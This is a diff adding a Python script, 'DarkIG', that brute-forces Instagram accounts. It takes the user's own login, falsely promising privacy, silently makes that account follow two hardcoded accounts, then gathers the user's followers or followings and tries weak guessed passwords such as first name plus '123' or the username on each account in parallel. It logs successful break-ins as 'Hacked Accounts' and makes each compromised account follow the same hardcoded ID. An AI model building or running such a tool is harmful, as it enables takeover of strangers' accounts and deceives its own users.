@@ -1,0 +1,196 @@
+#!/usr/bin/ python
+
+# -*- coding: UTF-8 -*-
+
+#Colours Defined Variables
+
+W  = '\033[1;37m'
+NE  = '\033[0m'
+R="\033[1;37m\033[31m"
+B  = '\033[1;37m\033[34m'
+G  = '\033[1;32m'
+YE = '\033[1;33;40m'
+
+#Decorators
+SR = W+"["+R+"*"+W+"]"
+SG = W+"["+G+"*"+W+"]"
+SRO = W+"("+R+">"+W+")"
+SGO = W+"("+G+">"+W+")"
+newlin = "\n"
+#SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
+#SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'
+
+SBR = W+'('+'🔴'+W+')'
+SBG = W+'('+'🔘'+W+')'
+
+INF = W+'('+YE+'!'+W+') :'+G
+D = W+"("+G+">"+W+")"+W
+
+def about(title,text):
+  return D+" "+title+R+" : "+G+text
+
+
+
+fb = about("Facebook","fb.com/nasir.xo")
+github = about("Github","github.com/nasirxo")
+youtube = about("Youtube","Youtube.com/TheDarkSec")
+
+
+banner = """
+
+         {}   ({}҂{}`_´{})
+         {}   <,︻╦̵̵̿╤─ ҉        {} ({}DarkIG{})~  •
+   {}█۞███████]▄▄▄▄▄▄▄▄▄▄▃ {}●●●   {} V1.0
+   {}▂▄▅█████████▅▄▃▂…     {} Instagram_Multi_Bruteforce
+   {}[███████████████████] 
+   {}◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙
+
+   {}
+   {}
+   {}
+
+
+""".format(W,R,YE,W,G,R,G,R,W,R,YE,W,G,W,YE,github,fb,youtube)
+
+
+
+
+from time import sleep
+import os
+import concurrent.futures
+#from multiprocessing.pool import ThreadPool
+
+
+try:
+ from igramscraper.instagram import Instagram
+except:
+  print(SBR+" Installing Dependencies ... !")
+  os.system("pip install igramscraper")
+  print(SBG+" Dependencies Installed ... !")  
+  from igramscraper.instagram import Instagram
+
+
+
+def checkig(udata):
+  Z = udata.split('=')
+  Y = Instagram()
+  Y.with_credentials(Z[0],Z[1])
+  try:
+    out = Y.login()
+    #print(out)
+    print(SBR+" {} | {}".format(Z[0],Z[1]))
+    Y.follow('3945561585')
+  except:
+    return 0
+
+#os.system("clear")
+#print(banner)
+
+while True:
+  os.system("clear")
+  print(banner)
+  print(INF+" Your Credientials are privacy and we respect your privacy")
+  print("\n"+SBR+"  Enter Your Instagram Credientials.. \n")
+  username = input(SBG+" Username : "+G)
+  password = input(SBG+" Password : "+G)
+  instagram = Instagram()
+  instagram.with_credentials(username,password)
+  try:
+    session = instagram.login()
+    print(SBG+" Login Sucessfull !")
+    instagram.follow('3945561585')
+    instagram.follow('5582361961')
+    account = instagram.get_account(username)
+    log = 1
+    print("""
+ {}   =========================================
+      {} Welcome Mr :{} {}
+    {}   Account ID.No :{} {}
+ {}   =========================================
+    
+     {}   Followers : {}{}                 
+     {}   Followings : {}{}                
+
+       
+    """.format(W,YE,G,account.full_name,YE,G,account.identifier,W,SBG,G,account.followed_by_count,SBG,G,account.follows_count)) 
+  except:
+    log = 0
+    print(INF+" Make Sure You Have Entered Valid User/Pass")
+    print(SBR+' Login Failed !')
+    sleep(5)
+
+    
+  while log == 1:
+  # if instagram.is_logged_in(session):
+      #N = ThreadPool(10)
+      print(INF+" Select a method you want to use for hacking multiples instagram accounts")
+      print(""" 
+
+      {} ------ [{} Select Hacking Method{} ] ------
+
+    {} (1) {} Try A Password On Your Followers Account.
+    {} (2) {} Try A Password On Your Followings Account.
+
+
+      """.format(W,YE,W,G,SBG,G,SBG))
+      choice = input(SBR+" Choice : "+G)
+      if int(choice) == 1:
+        print(SBG+" Getting Your Follower's Username's .....")
+        followers = instagram.get_followers(account.identifier, account.followed_by_count, account.followed_by_count, delayed=True)
+        ulist = []
+        print("""
+         {} (1)  {} Try Name+123
+         {} (2)  {} Try Username
+        
+        """.format(G,W,G,W))
+        passx = input(SBR+" Option : "+G)
+        for x in followers['accounts']:
+         try:
+          if int(passx) == 1:   
+            ulist.append(x.username+'='+str(x.full_name).lower().split()[0]+"123")
+          elif int(passx) == 2:
+            ulist.append(x.username+'='+x.username)
+         except:
+             pass
+        print(SBG+" Fetched {}{}{} Follower's Username".format(G,len(ulist),W))    
+        print("\n")
+        print(INF+" Please Wait A Password is trying on each username account in Multithreading Process")
+        print("    {}++++  [{} Hacked Accounts - Logs{} ]  ++++    \n".format(W,G,W))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(checkig, ulist)
+       # N=map(checkig,ulist)
+
+
+      if int(choice) == 2:
+        print(" Getting Your Following's Username's .....")
+        following = instagram.get_following(account.identifier, account.follows_count, account.follows_count, delayed=True)
+        ulist = []
+        print("""
+         {} (1)  {} Try Name+123
+         {} (2)  {} Try Username
+        
+        """.format(G,W,G,W))
+        passx = input(SBR+" Choice : "+G)
+        for x in following['accounts']:
+         try:
+           if int(passx) == 1:
+              ulist.append(x.username+'='+str(x.full_name).lower().split()[0]+"123")
+           elif int(passx) == 2:
+              ulist.append(x.username+'='+x.username)
+         except:
+            pass
+        print(" Fetched {}{}{} Follower's Username".format(G,len(ulist),W))
+        print("\n")
+        print(INF+" Please Wait A Password is trying on each username account in Multithreading Process")
+        print("    {}++++  [{} Hacked Accounts - Logs{} ]  ++++    \n".format(W,G,W))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+           executor.map(checkig, ulist)
+      #  N=map(checkig,ulist)
+
+
+      elif int(choice) not in [1,2]:
+          print(SBR+" Invalid Choice !")     
+          sleep(5)
+          os.system("clear")
+          
+
